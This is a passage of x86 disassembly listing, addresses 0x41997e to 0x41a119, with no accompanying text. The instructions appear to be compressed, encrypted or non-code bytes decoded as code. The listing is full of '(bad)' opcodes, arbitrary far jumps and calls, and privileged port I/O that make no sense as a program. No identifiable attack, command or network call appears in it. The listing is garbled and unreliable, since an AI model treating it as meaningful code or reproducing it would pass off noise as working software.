  41997e:	sbb    esp,DWORD PTR [ebp-0x59]
  419981:	dec    eax
  419982:	or     bl,BYTE PTR [ecx]
  419984:	dec    eax
  419985:	pop    edi
  419986:	aad    0x90
  419988:	jge    0x4199b1
  41998a:	pop    ebx
  41998b:	mov    dl,0x83
  41998d:	(bad)  
  41998e:	jno    0x419936
  419990:	push   dx
  419992:	and    al,0x65
  419994:	dec    ecx
  419995:	add    esi,esi
  419997:	lock push edx
  419999:	test   al,0x47
  41999b:	test   eax,0xc5a33ce6
  4199a0:	mul    DWORD PTR [ebp+0x2e3e4986]
  4199a6:	cmp    al,0xf0
  4199a8:	aad    0x64
  4199aa:	push   0xffffffec
  4199ac:	xchg   edi,eax
  4199ad:	pop    ecx
  4199ae:	jp     0x419957
  4199b0:	cld    
  4199b1:	xor    cl,al
  4199b3:	arpl   WORD PTR [esi-0x58],cx
  4199b6:	mov    cl,0x94
  4199b8:	push   edx
  4199b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199ba:	or     DWORD PTR [edi-0x1cde1ff5],0x35
  4199c1:	inc    edx
  4199c2:	xchg   DWORD PTR [ebx+0x2a],ebp
  4199c5:	push   esi
  4199c6:	jmp    0xb456:0x916583b9
  4199cd:	jmp    0x419a2e
  4199cf:	or     al,0x99
  4199d1:	jecxz  0x41996f
  4199d3:	jge    0x4199a8
  4199d5:	cmp    edx,DWORD PTR [eax+0x41c90647]
  4199db:	pushf  
  4199dc:	in     eax,0x33
  4199de:	stos   BYTE PTR es:[edi],al
  4199df:	add    BYTE PTR [esi-0xa],ah
  4199e2:	xor    BYTE PTR [ebx-0x17f2cff5],0xde
  4199e9:	mov    ds:0x4477119,al
  4199ee:	bnd jp 0x419a68
  4199f1:	dec    edi
  4199f2:	add    cl,BYTE PTR [ebx]
  4199f4:	int3   
  4199f5:	out    dx,al
  4199f6:	fs mov ch,0xb6
  4199f9:	(bad)  
  4199fa:	not    BYTE PTR [esi-0x1db214c4]
  419a00:	out    dx,eax
  419a01:	xchg   edi,eax
  419a02:	pop    ecx
  419a03:	and    DWORD PTR ds:[ebx+0x5a444e48],eax
  419a0a:	ins    DWORD PTR es:[edi],dx
  419a0b:	es push eax
  419a0d:	lods   al,BYTE PTR ds:[esi]
  419a0e:	mov    dl,0x71
  419a10:	mov    ds:0xe9fe452,al
  419a15:	loop   0x419a3e
  419a17:	ja     0x419a2e
  419a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a1a:	xor    edx,DWORD PTR [ebp+0x72]
  419a1d:	shr    BYTE PTR ds:0x231c9881,0x82
  419a24:	xchg   esi,eax
  419a25:	jae    0x419a59
  419a27:	ds and dl,al
  419a2a:	scas   al,BYTE PTR es:[edi]
  419a2b:	and    BYTE PTR [edx-0x63],0xec
  419a2f:	mov    bl,0x51
  419a31:	push   cs
  419a32:	daa    
  419a33:	mov    edx,0x7042a6f2
  419a38:	enter  0x4519,0x40
  419a3c:	arpl   WORD PTR [edi-0x433cb6c2],di
  419a42:	les    edi,FWORD PTR [eax+0x73df970d]
  419a48:	push   esp
  419a49:	dec    eax
  419a4a:	inc    ebp
  419a4b:	scas   al,BYTE PTR es:[edi]
  419a4c:	xor    al,0x92
  419a4e:	sar    DWORD PTR [edx+0x5a225b9f],cl
  419a54:	ss repnz dec esi
  419a57:	add    ch,BYTE PTR [eax+eiz*1]
  419a5a:	xchg   esp,eax
  419a5b:	jnp    0x419ad6
  419a5d:	push   esp
  419a5e:	hlt    
  419a5f:	addr16 (bad) 
  419a61:	xor    eax,edx
  419a63:	out    dx,al
  419a64:	aaa    
  419a65:	rol    DWORD PTR [ecx-0x52fc2e6c],1
  419a6b:	or     BYTE PTR [edi+0x23],bl
  419a6e:	sub    ecx,ebp
  419a70:	and    ebp,DWORD PTR [ecx+0x1e5a8602]
  419a76:	xchg   ebp,eax
  419a77:	push   ecx
  419a78:	pop    esp
  419a79:	cli    
  419a7a:	lahf   
  419a7b:	xor    ch,cl
  419a7d:	and    esi,DWORD PTR [esi+ebx*8+0x426e24c8]
  419a84:	jo     0x419aba
  419a86:	repz aam 0x0
  419a89:	cmp    eax,DWORD PTR [ebx+0x4de02bc3]
  419a8f:	inc    edi
  419a90:	addr16 js 0x419ab5
  419a93:	gs inc ecx
  419a95:	repz inc esi
  419a97:	fwait
  419a98:	cmp    DWORD PTR [ecx],0xffffff8b
  419a9b:	lods   eax,DWORD PTR ds:[esi]
  419a9c:	call   0x977e17f1
  419aa1:	lahf   
  419aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aa3:	mov    ebp,0xa160e302
  419aa8:	add    eax,0x9736911
  419aad:	retf   
  419aae:	mov    edi,0xd3a4ef40
  419ab3:	add    BYTE PTR [ebp+0x7c1d85a2],bh
  419ab9:	lods   al,BYTE PTR ds:[esi]
  419aba:	mov    edi,0x4eb2cdd1
  419abf:	and    DWORD PTR [ebp+0x40],edx
  419ac2:	cmp    DWORD PTR [eax+0xa],ebp
  419ac5:	clc    
  419ac6:	cmp    bh,BYTE PTR [edi+0x26d45a9e]
  419acc:	mov    ?,esp
  419ace:	fld    TBYTE PTR [ebx]
  419ad0:	cmp    DWORD PTR [ecx-0x4ec25a05],ebx
  419ad6:	pop    eax
  419ad7:	jmp    0x7c49:0x9a376d02
  419ade:	cwde   
  419adf:	push   edx
  419ae0:	popf   
  419ae1:	mov    esi,?
  419ae3:	dec    ecx
  419ae4:	test   DWORD PTR [ebp+0x241921dc],edx
  419aea:	js     0x419b66
  419aec:	cld    
  419aed:	nop
  419aee:	mov    ah,0x1d
  419af0:	lock fldenv [ecx]
  419af3:	aaa    
  419af4:	rcl    BYTE PTR [eax-0xe],1
  419af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af8:	test   eax,0x4177e909
  419afd:	pop    edi
  419afe:	add    BYTE PTR [ebp+0x6b],bl
  419b01:	jge    0x419ad3
  419b03:	add    eax,0xdbecb9cc
  419b08:	xchg   edx,eax
  419b09:	inc    esp
  419b0a:	in     al,dx
  419b0b:	scas   al,BYTE PTR es:[edi]
  419b0c:	cwde   
  419b0d:	gs dec esp
  419b0f:	mov    esp,0x78b7c76c
  419b14:	sar    BYTE PTR [edx-0x22],1
  419b17:	rol    BYTE PTR [ebx-0x7],1
  419b1a:	lea    edi,[ebx+ebx*8-0x450e274d]
  419b21:	lea    esi,[esi]
  419b23:	adc    DWORD PTR [edi-0x39fcf56d],ebp
  419b29:	pop    esp
  419b2a:	aas    
  419b2b:	cmp    al,0x28
  419b2d:	jnp    0x419ad9
  419b2f:	clc    
  419b30:	(bad)  
  419b31:	mov    ah,0x6d
  419b33:	outs   dx,DWORD PTR ds:[esi]
  419b34:	aas    
  419b35:	mov    ch,0xc2
  419b37:	(bad)  
  419b38:	loopne 0x419ad8
  419b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b3b:	bound  edx,QWORD PTR [ecx+0x52]
  419b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b3f:	mov    bh,0x16
  419b41:	add    al,0xc1
  419b43:	fstp   QWORD PTR [eax]
  419b45:	mov    dl,0x1b
  419b47:	ret    
  419b48:	push   edi
  419b49:	enter  0x369c,0xc5
  419b4d:	addr16 or al,0x59
  419b50:	mov    edx,0x6583f3bc
  419b55:	mov    cl,0xce
  419b57:	loope  0x419b83
  419b59:	fwait
  419b5a:	adc    esi,ecx
  419b5c:	retf   
  419b5d:	mov    ds:0xa4e6acf4,eax
  419b62:	push   ss
  419b63:	and    eax,0xaf52280e
  419b68:	add    DWORD PTR [ebx],esi
  419b6a:	or     eax,0xeeda4bfe
  419b6f:	aaa    
  419b70:	mov    esp,DWORD PTR [ebx+0xb]
  419b73:	push   0x3e
  419b75:	xchg   BYTE PTR [esi-0x47],al
  419b78:	push   esi
  419b79:	xor    al,0xc7
  419b7b:	rcr    BYTE PTR [ebp+0x6f19d0dc],0xc
  419b82:	(bad)  
  419b83:	mov    ch,0x37
  419b85:	cli    
  419b86:	rcr    ecx,cl
  419b88:	fistp  WORD PTR [ecx+0x3dc175e8]
  419b8e:	jmp    0x4792:0xdb2c6b07
  419b95:	cdq    
  419b96:	lods   al,BYTE PTR ds:[esi]
  419b97:	adc    BYTE PTR [esi-0x7c],bl
  419b9a:	dec    esi
  419b9b:	add    eax,0x5b42314
  419ba0:	cmp    BYTE PTR ds:0x628172b4,ch
  419ba6:	cli    
  419ba7:	jecxz  0x419b44
  419ba9:	fwait
  419baa:	lods   eax,DWORD PTR ds:[esi]
  419bab:	or     BYTE PTR [edx],dl
  419bad:	or     bl,BYTE PTR [eax]
  419baf:	hlt    
  419bb0:	pop    edx
  419bb1:	into   
  419bb2:	sahf   
  419bb3:	dec    eax
  419bb4:	push   esp
  419bb5:	jnp    0x419be4
  419bb7:	push   cs
  419bb8:	sahf   
  419bb9:	dec    ebp
  419bba:	or     al,0x4f
  419bbc:	loop   0x419b5b
  419bbe:	xchg   esi,eax
  419bbf:	adc    BYTE PTR [esi],0x9f
  419bc2:	je     0x419bd8
  419bc4:	test   BYTE PTR [ecx+0x59165f47],bh
  419bca:	ins    DWORD PTR es:[di],dx
  419bcc:	dec    esi
  419bcd:	sahf   
  419bce:	fnstcw WORD PTR [esi+eax*8]
  419bd1:	mov    dl,0x2a
  419bd3:	icebp  
  419bd4:	mov    cl,BYTE PTR [edx]
  419bd6:	jb     0x419bbb
  419bd8:	add    DWORD PTR [edi-0x79bd99e2],edi
  419bde:	(bad)  
  419bdf:	test   eax,0xabeb46b8
  419be4:	jge    0x419c17
  419be6:	pop    edi
  419be7:	mov    cs,WORD PTR [edi+0x38]
  419bea:	inc    esi
  419beb:	xchg   ebx,eax
  419bec:	mov    eax,ds:0xe95653dd
  419bf1:	test   DWORD PTR ds:0xf8e40000,eax
  419bf7:	inc    esi
  419bf8:	scas   eax,DWORD PTR es:[edi]
  419bf9:	sbb    ch,BYTE PTR [eax]
  419bfb:	push   esp
  419bfc:	mov    eax,0x72b8fca1
  419c01:	add    ebp,ecx
  419c03:	les    esi,FWORD PTR [edx+0x160c3b21]
  419c09:	cmp    eax,0x9161604
  419c0e:	xchg   esi,eax
  419c0f:	sub    ebx,ebp
  419c11:	call   0xf19d9e18
  419c16:	dec    esp
  419c17:	js     0x419bfd
  419c19:	enter  0xce4d,0xe1
  419c1d:	stos   BYTE PTR es:[edi],al
  419c1e:	mov    eax,ds:0x4b0fcc35
  419c23:	pusha  
  419c24:	es dec edx
  419c26:	aam    0x3f
  419c28:	mov    WORD PTR [ebx+0x4be935b],gs
  419c2e:	inc    edx
  419c2f:	dec    eax
  419c30:	stos   DWORD PTR es:[edi],eax
  419c31:	inc    eax
  419c32:	mov    WORD PTR [ebx+0x7116ce0c],ss
  419c38:	psllw  mm4,QWORD PTR [ebp+0x3ea3b517]
  419c3f:	mov    ebx,0xacca701c
  419c44:	or     BYTE PTR [edi],cl
  419c46:	push   edx
  419c47:	repz mov ecx,esp
  419c4a:	dec    esi
  419c4b:	jnp    0x419c2a
  419c4d:	test   DWORD PTR [edx],ecx
  419c4f:	sbb    eax,0xcca0d71b
  419c54:	jmp    0x419c2a
  419c56:	sbb    al,0x53
  419c58:	sbb    eax,0x83e439b
  419c5d:	jmp    0xd4b5:0xb7e4e2c9
  419c64:	pop    eax
  419c65:	dec    eax
  419c66:	lock dec esp
  419c68:	jnp    0x419caa
  419c6a:	ret    0xf04e
  419c6d:	jno    0x419c92
  419c6f:	jl     0x419c68
  419c71:	or     eax,0xf54893a2
  419c76:	adc    eax,0x35c2c255
  419c7b:	data16 data16 adc dl,0x1c
  419c80:	or     al,0x3
  419c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c83:	shl    BYTE PTR [ebx-0x700fc0dc],0xaf
  419c8a:	inc    eax
  419c8b:	or     cl,BYTE PTR [ebp+esi*2-0x57989bf5]
  419c92:	xchg   ecx,eax
  419c93:	fnstcw WORD PTR [edx-0x22]
  419c96:	fs inc esp
  419c98:	add    cl,BYTE PTR [edx-0x4e]
  419c9b:	je     0x419ccb
  419c9d:	add    al,cl
  419c9f:	nop
  419ca0:	popa   
  419ca1:	push   ecx
  419ca2:	and    al,0xf1
  419ca4:	xor    al,BYTE PTR [edx+eiz*1+0x22]
  419ca8:	not    eax
  419caa:	mov    ds:0x85c1f231,al
  419caf:	repnz add edi,DWORD PTR [ebx-0x1ec9eb6f]
  419cb6:	lds    ecx,FWORD PTR [ebp-0x5ee50920]
  419cbc:	pop    edx
  419cbd:	inc    ecx
  419cbe:	mov    dl,0x42
  419cc0:	mov    bh,0x9d
  419cc2:	in     al,0x97
  419cc4:	stc    
  419cc5:	sbb    dh,al
  419cc7:	dec    ebx
  419cc8:	call   0x863e:0x3c0afa65
  419ccf:	push   ebx
  419cd0:	enter  0x8857,0x18
  419cd4:	cmp    al,0x18
  419cd6:	sbb    ebx,DWORD PTR [edx+0x3904c85b]
  419cdc:	dec    ebp
  419cdd:	je     0x419c84
  419cdf:	adc    cl,BYTE PTR ds:0x1b13c471
  419ce5:	pusha  
  419ce6:	jg     0x419d0a
  419ce8:	clc    
  419ce9:	or     al,0xbf
  419ceb:	jb     0x419cd5
  419ced:	sub    BYTE PTR [ebx+0x67cff5a8],0xbd
  419cf4:	repnz (bad) 
  419cf7:	cmp    dl,dl
  419cf9:	in     al,dx
  419cfa:	scas   eax,DWORD PTR es:[edi]
  419cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cfc:	add    BYTE PTR [edx],0x6d
  419cff:	scas   al,BYTE PTR es:[edi]
  419d00:	ret    0xfbf
  419d03:	loop   0x419d29
  419d05:	and    bl,bh
  419d07:	test   al,0x6b
  419d09:	test   al,0x8
  419d0b:	jae    0x419cb9
  419d0d:	mov    esi,0x1a6596e7
  419d12:	jg     0x419cc6
  419d14:	add    eax,DWORD PTR [ebx-0x2fbf45ce]
  419d1a:	xchg   ecx,eax
  419d1b:	les    esi,FWORD PTR [edi+esi*4-0x59]
  419d1f:	add    al,0x18
  419d21:	js     0x419d4b
  419d23:	mov    al,ds:0x2db51fe1
  419d28:	push   es
  419d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d2a:	dec    edi
  419d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d2c:	dec    esp
  419d2d:	test   al,0x6f
  419d2f:	shr    BYTE PTR [ecx+0xf22b249],1
  419d35:	int3   
  419d36:	jp     0x419d4b
  419d38:	out    0x2d,al
  419d3a:	adc    al,0x4
  419d3c:	cmc    
  419d3d:	pop    esi
  419d3e:	add    BYTE PTR [ebx],0x4c
  419d41:	mov    ds:0xd2fb2e07,al
  419d46:	cwde   
  419d47:	mov    ds:0x4cad6d81,al
  419d4c:	shl    BYTE PTR [ebx+0x6b],cl
  419d4f:	adc    esp,ebx
  419d51:	add    DWORD PTR [edi+eax*4-0x58d3c4a7],esp
  419d58:	out    dx,al
  419d59:	adc    al,0x45
  419d5b:	and    ah,ch
  419d5d:	fbstp  TBYTE PTR [esi]
  419d5f:	jmp    0x2b098b81
  419d64:	je     0x419d36
  419d66:	rcl    DWORD PTR cs:[esi+ebx*1+0x6dce9a08],cl
  419d6e:	adc    DWORD PTR [ecx-0x5f60ad04],esp
  419d74:	int3   
  419d75:	push   0xf7ffd650
  419d7a:	sbb    cl,dl
  419d7c:	call   0x9660:0xcceddb7d
  419d83:	pusha  
  419d84:	cld    
  419d85:	jmp    0xaa59e298
  419d8a:	bound  edi,QWORD PTR [ebp+eax*4-0x73]
  419d8e:	test   DWORD PTR [edx+0x1e503ca8],edx
  419d94:	sti    
  419d95:	xchg   esp,eax
  419d96:	or     eax,0xb511d55a
  419d9b:	sub    al,0x3a
  419d9d:	ret    
  419d9e:	cli    
  419d9f:	fucom  st(2)
  419da1:	pop    ebp
  419da2:	outs   dx,DWORD PTR ds:[esi]
  419da3:	loope  0x419d4e
  419da5:	mov    ebx,0x60b60048
  419daa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dab:	ja     0x419da8
  419dad:	leave  
  419dae:	out    0x9,eax
  419db0:	inc    ebx
  419db1:	mov    ah,0x85
  419db3:	xor    eax,0xbe50ef18
  419db8:	(bad)  
  419db9:	nop
  419dba:	and    BYTE PTR [eax+esi*1],ch
  419dbd:	fwait
  419dbe:	mov    dh,0xf1
  419dc0:	mov    ebx,0xdc80fdd
  419dc5:	cmp    eax,0x688df2e0
  419dca:	and    eax,eax
  419dcc:	mov    edx,0xb13d0176
  419dd1:	sub    esi,edx
  419dd3:	push   edi
  419dd4:	icebp  
  419dd5:	retf   0x2f4f
  419dd8:	mov    eax,0xb7b27255
  419ddd:	xor    ecx,DWORD PTR [eax+0x2ac732cb]
  419de3:	jo     0x419e0c
  419de5:	sub    edx,esi
  419de7:	lock dec ecx
  419de9:	pushf  
  419dea:	call   0x6bd80a0
  419def:	and    DWORD PTR [ebp+0x5b2ab4f],ebp
  419df5:	inc    BYTE PTR [esi+ecx*8+0x571feb6a]
  419dfc:	loope  0x419e5f
  419dfe:	pop    esp
  419dff:	or     al,0x3a
  419e01:	cmp    ebx,DWORD PTR [eax-0x3b059d16]
  419e07:	pop    ds
  419e08:	xchg   DWORD PTR [edx-0x538ad869],ebp
  419e0e:	(bad)  
  419e0f:	enter  0xcdb8,0xba
  419e13:	mov    fs,WORD PTR [edx]
  419e15:	cwde   
  419e16:	ret    
  419e17:	inc    ecx
  419e18:	je     0x419ded
  419e1a:	cli    
  419e1b:	xor    BYTE PTR [ebx+0x12],0x69
  419e1f:	dec    ebx
  419e20:	jecxz  0x419e60
  419e22:	dec    esi
  419e23:	and    bl,BYTE PTR [ebp-0x4e]
  419e26:	prefetcht0 BYTE PTR [edx+0x2a]
  419e2a:	push   es
  419e2b:	jmp    0xe4055e75
  419e30:	jbe    0x419ddf
  419e32:	jle    0x419df2
  419e34:	mov    bl,0xe3
  419e36:	adc    al,0x84
  419e38:	out    0xe,eax
  419e3a:	(bad)  
  419e3b:	mov    edi,0x1a581cc0
  419e40:	in     eax,0x8b
  419e42:	jge    0x419e37
  419e44:	inc    DWORD PTR [edx]
  419e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e47:	jns    0x419e24
  419e49:	xchg   edx,eax
  419e4a:	retf   
  419e4b:	mov    DWORD PTR [eax+0x4f0e018],ebx
  419e51:	xlat   BYTE PTR ds:[ebx]
  419e52:	jnp    0x419de2
  419e54:	dec    edx
  419e55:	or     BYTE PTR [eax],dh
  419e57:	and    al,0x18
  419e59:	out    dx,al
  419e5a:	call   0x439d:0x10680178
  419e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e62:	inc    ebp
  419e63:	sub    ebx,DWORD PTR [eax]
  419e65:	adc    ebp,ebx
  419e67:	sbb    ebp,DWORD PTR [eax*8+0x268172f7]
  419e6e:	inc    edx
  419e6f:	adc    al,0xff
  419e71:	loopne 0x419e52
  419e73:	jbe    0x419e86
  419e75:	mov    eax,0xf63ff14f
  419e7a:	push   eax
  419e7b:	push   ebp
  419e7c:	push   ds
  419e7d:	add    al,0xb5
  419e7f:	pop    esi
  419e80:	pop    ebx
  419e81:	jl     0x419e87
  419e83:	and    edx,edi
  419e85:	lods   eax,DWORD PTR ds:[esi]
  419e86:	pop    ecx
  419e87:	(bad)  
  419e88:	in     al,dx
  419e89:	adc    esp,DWORD PTR [edx+0x76]
  419e8c:	repnz mov ebx,0x12cbbd8c
  419e92:	adc    BYTE PTR [ebp-0x6e8764d2],bl
  419e98:	retf   
  419e99:	or     DWORD PTR [edx+ebp*8],0xd05885ae
  419ea0:	rcr    DWORD PTR [edi],0x4e
  419ea3:	xchg   edi,eax
  419ea4:	repnz add bh,bh
  419ea7:	inc    esi
  419ea8:	push   ds
  419ea9:	ss jmp ebp
  419eac:	push   ss
  419ead:	mov    ds:0x8ba9bc2f,al
  419eb2:	lods   eax,DWORD PTR ds:[esi]
  419eb3:	pop    ss
  419eb4:	aas    
  419eb5:	stos   BYTE PTR es:[edi],al
  419eb6:	popa   
  419eb7:	push   edi
  419eb8:	adc    DWORD PTR [ebx-0x7ef31a29],esp
  419ebe:	xchg   edi,eax
  419ebf:	std    
  419ec0:	jbe    0x419e80
  419ec2:	mov    edi,gs
  419ec4:	scas   al,BYTE PTR es:[edi]
  419ec5:	leave  
  419ec6:	jmp    0x419e94
  419ec8:	and    bl,BYTE PTR [esp+edx*1-0x4cf1260c]
  419ecf:	dec    esi
  419ed0:	jmp    0x168fe8a3
  419ed5:	dec    esp
  419ed6:	sar    BYTE PTR [ecx],0xa7
  419ed9:	shl    BYTE PTR [esi-0x10],cl
  419edc:	sbb    bl,BYTE PTR [esi-0x3b317dd5]
  419ee2:	jae    0x419f10
  419ee4:	pop    esi
  419ee5:	aas    
  419ee6:	jle    0x419f1a
  419ee8:	mov    eax,ds:0x9c3dd73d
  419eed:	lock fild DWORD PTR [ecx-0xa]
  419ef1:	pop    eax
  419ef2:	sub    bl,BYTE PTR [ecx-0x13]
  419ef5:	jo     0x419e87
  419ef7:	xchg   esi,eax
  419ef8:	sar    DWORD PTR [esi-0xf85e7de],0x53
  419eff:	xchg   ebx,eax
  419f00:	cs mov esi,0x92b02f04
  419f06:	jl     0x419e8a
  419f08:	inc    ecx
  419f09:	xor    eax,0x2153a72
  419f0e:	pop    edx
  419f0f:	pop    ecx
  419f10:	cld    
  419f11:	outs   dx,BYTE PTR ds:[esi]
  419f12:	stos   BYTE PTR es:[edi],al
  419f13:	push   edx
  419f14:	cwde   
  419f15:	xor    al,0xa0
  419f17:	push   ds
  419f18:	ins    BYTE PTR es:[edi],dx
  419f19:	js     0x419e9c
  419f1b:	loopne 0x419f06
  419f1d:	add    eax,DWORD PTR [ecx+0x47]
  419f20:	pop    ebx
  419f21:	enter  0xb763,0x79
  419f25:	push   esi
  419f26:	or     ebx,DWORD PTR [ebx-0x20]
  419f29:	pop    ebp
  419f2a:	imul   esi,DWORD PTR [ebx+0x12268558],0xffffff8b
  419f31:	add    al,0x5
  419f33:	(bad)  
  419f34:	jle    0x419f95
  419f36:	scas   eax,DWORD PTR es:[edi]
  419f37:	adc    BYTE PTR [edi],0x9f
  419f3a:	and    esi,DWORD PTR [ebx]
  419f3c:	clc    
  419f3d:	std    
  419f3e:	test   al,0x89
  419f40:	xlat   BYTE PTR ds:[ebx]
  419f41:	and    eax,0xa6cb63d6
  419f46:	jl     0x419fc3
  419f48:	outs   dx,BYTE PTR ds:[esi]
  419f49:	add    al,0x4a
  419f4b:	fcmove st,st(3)
  419f4d:	sbb    bh,BYTE PTR [ecx]
  419f4f:	out    dx,al
  419f50:	and    BYTE PTR [ebx-0xb793f05],0x1f
  419f57:	mov    edx,0x6025a6cb
  419f5c:	pop    esi
  419f5d:	jecxz  0x419ef5
  419f5f:	or     bl,BYTE PTR [esi+eiz*4+0x30]
  419f63:	mov    ah,0x60
  419f65:	adc    DWORD PTR [ebx-0x672ce7ec],eax
  419f6b:	jne    0x419fa5
  419f6d:	test   DWORD PTR [ebx-0x1b24fe1b],edx
  419f73:	fidiv  DWORD PTR [edx]
  419f75:	sti    
  419f76:	imul   DWORD PTR [esi]
  419f78:	mov    dh,dl
  419f7a:	mov    edi,0x5a7bb97c
  419f7f:	out    dx,eax
  419f80:	mov    ds:0x18718257,eax
  419f85:	out    dx,al
  419f86:	add    ah,BYTE PTR [eax]
  419f88:	add    eax,0x8e9ba093
  419f8d:	mov    bl,0xfc
  419f8f:	rol    DWORD PTR [edx-0x21],1
  419f92:	inc    edx
  419f94:	aad    0xb2
  419f96:	sub    cl,BYTE PTR [ecx+0x1301b7f1]
  419f9c:	mov    edx,0x17df81fe
  419fa1:	aad    0x36
  419fa3:	dec    esi
  419fa4:	xchg   ecx,edx
  419fa6:	and    BYTE PTR [esi-0x46711443],0xd8
  419fad:	in     al,dx
  419fae:	dec    ecx
  419faf:	mov    eax,ds:0xfdf29f09
  419fb4:	push   0xffffff92
  419fb6:	aas    
  419fb7:	xor    al,0x6f
  419fb9:	stos   DWORD PTR es:[edi],eax
  419fba:	add    bl,al
  419fbc:	adc    eax,0xe41a8a56
  419fc1:	push   ss
  419fc2:	mov    bl,0xc9
  419fc4:	pop    ebp
  419fc5:	xor    al,0x9f
  419fc7:	(bad)  
  419fc9:	mov    eax,ds:0xf534b562
  419fce:	cmp    eax,0xa039372c
  419fd3:	add    BYTE PTR [ebp-0x38c4b819],bh
  419fd9:	enter  0x1b14,0xf3
  419fdd:	inc    ebp
  419fde:	lahf   
  419fdf:	sub    eax,0x87fb4d5a
  419fe4:	push   0xb889aed9
  419fe9:	inc    esi
  419fea:	cmp    BYTE PTR [esi+0x69b7e2d6],bh
  419ff0:	xlat   BYTE PTR ds:[ebx]
  419ff1:	lahf   
  419ff2:	(bad)  
  419ff3:	std    
  419ff4:	movntps XMMWORD PTR [edi+0x6c],xmm7
  419ff8:	retf   
  419ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ffa:	cmc    
  419ffb:	les    ebx,FWORD PTR [eax-0x1d]
  419ffe:	dec    esp
  419fff:	repnz neg BYTE PTR [ecx-0xc]
  41a003:	mov    al,ds:0x8fe8f30e
  41a008:	adc    BYTE PTR [edx-0x58],dh
  41a00b:	or     bl,BYTE PTR [ecx]
  41a00d:	mov    ecx,DWORD PTR [esi+0x21]
  41a010:	enter  0xd9c3,0x9f
  41a014:	mov    ebp,0x3744fdc0
  41a019:	aas    
  41a01a:	outs   dx,BYTE PTR ds:[esi]
  41a01b:	dec    esi
  41a01c:	jl     0x419fe8
  41a01e:	cmp    esp,esi
  41a020:	xchg   DWORD PTR [edx],eax
  41a022:	pop    esp
  41a023:	cmp    eax,0x76d34dc8
  41a028:	das    
  41a029:	test   al,0xe9
  41a02b:	outs   dx,DWORD PTR ds:[esi]
  41a02c:	add    al,0x2e
  41a02e:	sbb    BYTE PTR ss:[esi],ch
  41a031:	out    0x92,eax
  41a033:	jge    0x41a0a7
  41a035:	or     DWORD PTR [esi-0x3a],ebx
  41a038:	bound  ecx,QWORD PTR [ebx-0x78]
  41a03b:	stc    
  41a03c:	ss rcr bl,1
  41a03f:	mov    esp,ebp
  41a041:	out    dx,eax
  41a042:	dec    edx
  41a043:	inc    edi
  41a044:	jmp    0x41a0b6
  41a046:	test   DWORD PTR [ecx],ebp
  41a048:	fstp   QWORD PTR [edi+0xb]
  41a04b:	dec    ebp
  41a04c:	fnsave [ecx+ecx*4-0x657f2ea0]
  41a053:	out    0xda,eax
  41a055:	ja     0x41a02b
  41a057:	jmp    0x41a061
  41a059:	jb     0x41a034
  41a05b:	outs   dx,DWORD PTR ds:[esi]
  41a05c:	and    eax,0xda39e254
  41a061:	frstor [ecx]
  41a063:	xlat   BYTE PTR ds:[ebx]
  41a064:	mov    DWORD PTR [ebx],ebx
  41a066:	ret    0x244d
  41a069:	lods   eax,DWORD PTR gs:[esi]
  41a06b:	aaa    
  41a06c:	sub    DWORD PTR [edx-0x4c],eax
  41a06f:	loope  0x41a0b5
  41a071:	in     al,dx
  41a072:	imul   edx,DWORD PTR [ecx-0x47],0x46
  41a076:	add    ebx,0xc6bfdb69
  41a07c:	adc    eax,0x2057985e
  41a081:	sbb    ebx,DWORD PTR [eax]
  41a083:	ret    0x4016
  41a086:	scas   eax,DWORD PTR es:[edi]
  41a087:	or     ebp,edx
  41a089:	adc    al,0x88
  41a08b:	sbb    eax,ecx
  41a08d:	add    BYTE PTR [esp+edi*2-0x13],0x57
  41a092:	xor    cl,bh
  41a094:	mov    ebx,0x923d6d25
  41a099:	mov    eax,0x91bfcdbf
  41a09f:	aam    0x6b
  41a0a1:	int3   
  41a0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a3:	xchg   esi,eax
  41a0a4:	sbb    al,0x3b
  41a0a6:	ds dec esi
  41a0a8:	jecxz  0x41a0ed
  41a0aa:	xlat   BYTE PTR ds:[ebx]
  41a0ab:	int    0x3b
  41a0ad:	sub    edi,ebp
  41a0af:	ins    DWORD PTR es:[edi],dx
  41a0b0:	ja     0x41a07a
  41a0b2:	in     al,0xfb
  41a0b4:	in     al,dx
  41a0b5:	arpl   WORD PTR [ecx+0x31],si
  41a0b8:	daa    
  41a0b9:	test   DWORD PTR [esi+0x44a6c6dc],ecx
  41a0bf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41a0c1:	mov    ah,dh
  41a0c3:	out    0xca,al
  41a0c5:	call   0x70cf:0xde3bb8d3
  41a0cc:	adc    ch,BYTE PTR [esi+0x5f02694b]
  41a0d2:	dec    ebp
  41a0d3:	loopne 0x41a0db
  41a0d5:	add    eax,0xc74cd87e
  41a0da:	daa    
  41a0db:	into   
  41a0dc:	xchg   DWORD PTR [eax-0x5c1f1674],eax
  41a0e2:	xor    eax,0x3e305566
  41a0e7:	repz popa 
  41a0e9:	cmp    eax,0xa250928d
  41a0ee:	clc    
  41a0ef:	dec    ecx
  41a0f0:	pop    edx
  41a0f1:	cmp    al,0x51
  41a0f3:	xchg   ecx,eax
  41a0f4:	pushf  
  41a0f5:	and    DWORD PTR [ebp+0x49],esi
  41a0f8:	mov    fs,WORD PTR [ebp+0xc81179]
  41a0fe:	daa    
  41a0ff:	bound  edx,QWORD PTR [ecx+0x45b980bf]
  41a105:	jg     0x41a17e
  41a107:	mov    WORD PTR [edx],?
  41a109:	jle    0x41a0e4
  41a10b:	scas   eax,DWORD PTR es:[edi]
  41a10c:	cmp    eax,0x83bd8486
  41a111:	sbb    DWORD PTR [esi],eax
  41a113:	and    al,0xdf
  41a115:	push   0x5f
  41a117:	cmp    al,0x40
  41a119:	fwait
